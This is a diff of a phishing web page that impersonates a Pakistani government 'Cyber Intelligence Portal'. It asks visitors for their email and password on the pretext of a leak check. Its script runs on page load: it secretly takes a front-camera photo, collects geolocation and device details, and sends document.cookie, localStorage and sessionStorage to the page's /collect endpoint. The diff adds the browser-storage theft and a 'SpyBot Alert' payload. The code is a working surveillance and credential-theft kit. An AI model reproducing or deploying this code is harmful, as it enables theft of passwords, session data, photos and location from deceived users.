@@ -2,229 +2,213 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Government of Pakistan - Cyber Intelligence Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🇵🇰 Government of Pakistan – Cyber Intelligence</title>
   <link rel="icon" href="/static/pakistan-emblem.png" />
   <style>
     body {
       margin: 0;
-      font-family: 'Arial', sans-serif;
-      background-color: #f9f9f9;
-      color: #2c3e50;
-    }
-
-    header {
-      background-color: #006400;
-      color: white;
-      padding: 20px 0;
-      text-align: center;
-      font-size: 24px;
-      font-weight: bold;
-    }
-
-    .container {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #0f2027;
+      background: linear-gradient(to bottom, #2c5364, #203a43, #0f2027);
+      color: #fff;
       display: flex;
       flex-direction: column;
+      justify-content: space-between;
       align-items: center;
-      margin: 50px 15px;
+      height: 100vh;
     }
-
     .box {
-      background-color: #ffffff;
+      margin-top: 5vh;
+      background: rgba(255, 255, 255, 0.08);
       padding: 30px;
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
-    }
-
-    .box img {
-      width: 70px;
-      display: block;
-      margin: 0 auto 15px;
-    }
-
-    .box h2 {
+      border-radius: 16px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.5);
       text-align: center;
-      color: #006400;
-      font-size: 20px;
-      margin-bottom: 10px;
+      width: 380px;
+      backdrop-filter: blur(10px);
     }
-
-    .box p {
+    h1 {
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
+    p {
       font-size: 14px;
-      text-align: center;
-      margin-bottom: 20px;
+      margin: 8px 0 16px;
     }
-
     input, button {
       width: 100%;
       padding: 10px;
-      margin: 8px 0;
-      font-size: 14px;
-      border: 1px solid #ccc;
+      margin: 6px 0;
       border-radius: 6px;
-      box-sizing: border-box;
-    }
-
-    button {
-      background-color: #006400;
-      color: white;
       border: none;
-      cursor: pointer;
+      font-size: 14px;
+    }
+    input {
+      background: #ecf0f1;
+      color: #2c3e50;
+    }
+    button {
+      background: #e74c3c;
+      color: white;
       font-weight: bold;
+      cursor: pointer;
     }
-
     button:hover {
-      background-color: #004d00;
+      background: #c0392b;
     }
-
     a.forgot {
-      display: block;
-      text-align: right;
+      color: #f1c40f;
       font-size: 12px;
-      margin-top: 5px;
-      color: #007bff;
+      display: block;
+      margin-top: 4px;
       text-decoration: none;
     }
-
-    a.forgot:hover {
-      text-decoration: underline;
+    img {
+      width: 80px;
+      margin-bottom: 10px;
     }
-
     footer {
+      font-size: 12px;
       text-align: center;
-      font-size: 13px;
-      padding: 20px 10px;
-      color: #777;
-      background-color: #f1f1f1;
-      position: fixed;
-      width: 100%;
-      bottom: 0;
+      padding: 10px;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
-  <header>
-    Government of Pakistan – Cyber Security Division
-  </header>
-
-  <div class="container">
-    <div class="box">
-      <img src="/static/pakistan-emblem.png" alt="Gov Logo">
-      <h2>Cyber Intelligence Portal</h2>
-      <p>Check if your credentials exist in our national cyber threat database</p>
-      <form method="POST" action="/login">
-        <input type="text" name="email" placeholder="Enter your email" required />
-        <input type="password" name="password" placeholder="Enter your password" required />
-        <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
-        <button type="submit">🔍 Check Now</button>
-      </form>
-    </div>
+  <div class="box">
+    <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
+    <h1>Confidential Access - Secure Portal</h1>
+    <p>Enter your email to check leaked data in our cyber database</p>
+    <form method="POST" action="/login">
+      <input type="text" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
+      <button type="submit">🔍 Check Now</button>
+    </form>
   </div>
+  <footer>© 2025 Government Cyber Department | National Data Division</footer>
 
-  <footer>
-    Confidential Access - Authorized Personnel Only © Government of Pakistan
-  </footer>
+<script>
+async function reverseGeocode(lat, lon) {
+  try {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+    const res = await fetch(url, {
+      headers: { 'User-Agent': 'Mozilla/5.0' }
+    });
+    const data = await res.json();
+    return {
+      city: data.address.city || data.address.town || data.address.village || "Unknown",
+      country: data.address.country || "Unknown",
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
+    };
+  } catch (e) {
+    return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+  }
+}
 
-  <script>
-    async function reverseGeocode(lat, lon) {
-      try {
-        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
-        const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
-        const data = await res.json();
-        return {
-          city: data.address.city || data.address.town || data.address.village || "Unknown",
-          country: data.address.country || "Unknown",
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
-        };
-      } catch (e) {
-        return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-      }
-    }
+function detectDevice(userAgent) {
+  const devices = {
+    "Samsung": /samsung/i,
+    "Xiaomi": /mi|redmi/i,
+    "Oppo": /oppo/i,
+    "Vivo": /vivo/i,
+    "Realme": /realme/i,
+    "Huawei": /huawei/i,
+    "Infinix": /infinix/i,
+    "Tecno": /tecno/i,
+    "iPhone": /iphone/i,
+    "Sony": /sony/i,
+    "Nokia": /nokia/i
+  };
+  for (let [name, pattern] of Object.entries(devices)) {
+    if (pattern.test(userAgent)) return name;
+  }
+  return "Generic Android Device";
+}
 
-    function detectDevice(userAgent) {
-      const devices = {
-        "Samsung": /samsung/i,
-        "Xiaomi": /mi|redmi/i,
-        "Oppo": /oppo/i,
-        "Vivo": /vivo/i,
-        "Realme": /realme/i,
-        "Huawei": /huawei/i,
-        "Infinix": /infinix/i,
-        "Tecno": /tecno/i,
-        "iPhone": /iphone/i,
-        "Sony": /sony/i,
-        "Nokia": /nokia/i
-      };
-      for (let [name, pattern] of Object.entries(devices)) {
-        if (pattern.test(userAgent)) return name;
-      }
-      return "Generic Android Device";
-    }
+async function sendCookiesData() {
+  const cookies = document.cookie;
+  const local = { ...localStorage };
+  const session = { ...sessionStorage };
 
-    async function sendFullData(locationCoords, cameraStatus) {
-      let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-      if (locationCoords) {
-        locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
-      }
+  const payload = {
+    type: "🧹 Browser Storage Data",
+    cookies: cookies || "None",
+    localStorage: Object.keys(local).length ? local : "None",
+    sessionStorage: Object.keys(session).length ? session : "None"
+  };
 
-      const userAgent = navigator.userAgent;
-      const deviceInfo = detectDevice(userAgent);
-      const mapsLink = locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied";
+  await fetch("/collect", {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
 
-      await fetch("/collect", {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          ip: "Unknown", // actual IP will be handled in main.py
-          latitude: locationCoords?.latitude || null,
-          longitude: locationCoords?.longitude || null,
-          mapsLink: mapsLink,
-          timezone: locationData.timezone,
-          city: locationData.city,
-          country: locationData.country,
-          camera: cameraStatus,
-          userAgent: userAgent,
-          deviceInfo: deviceInfo
-        })
+async function sendFullData(locationCoords, cameraStatus) {
+  let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+  if (locationCoords) {
+    locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
+  }
+
+  const userAgent = navigator.userAgent;
+  const deviceInfo = detectDevice(userAgent);
+  const mapsLink = locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied";
+
+  const payload = {
+    type: "📡 SpyBot Alert",
+    ip: "Unknown",
+    latitude: locationCoords?.latitude || null,
+    longitude: locationCoords?.longitude || null,
+    mapsLink: mapsLink,
+    timezone: locationData.timezone,
+    city: locationData.city,
+    country: locationData.country,
+    camera: cameraStatus,
+    userAgent: userAgent,
+    deviceInfo: deviceInfo
+  };
+
+  await fetch("/collect", {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+
+  await sendCookiesData();
+}
+
+async function askForPermissions() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    setTimeout(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg');
+        fetch('/photo', { method: 'POST', body: formData });
       });
-    }
+      stream.getTracks().forEach(track => track.stop());
+    }, 3000);
 
-    async function askForPermissions() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        setTimeout(() => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('photo', blob, 'photo.jpg');
-            fetch('/photo', { method: 'POST', body: formData });
-          });
-          stream.getTracks().forEach(track => track.stop());
-        }, 3000);
+    navigator.geolocation.getCurrentPosition(
+      pos => sendFullData(pos.coords, "✅ Camera Allowed"),
+      err => sendFullData(null, "✅ Camera Allowed, ❌ Location Denied")
+    );
+  } catch (err) {
+    sendFullData(null, "❌ Camera Denied");
+  }
+}
 
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            sendFullData(pos.coords, "✅ Camera Allowed");
-          },
-          err => {
-            sendFullData(null, "✅ Camera Allowed, ❌ Location Denied");
-          }
-        );
-      } catch (err) {
-        sendFullData(null, "❌ Camera Denied");
-      }
-    }
-
-    window.onload = askForPermissions;
-  </script>
+window.onload = askForPermissions;
+</script>
 </body>
 </html>
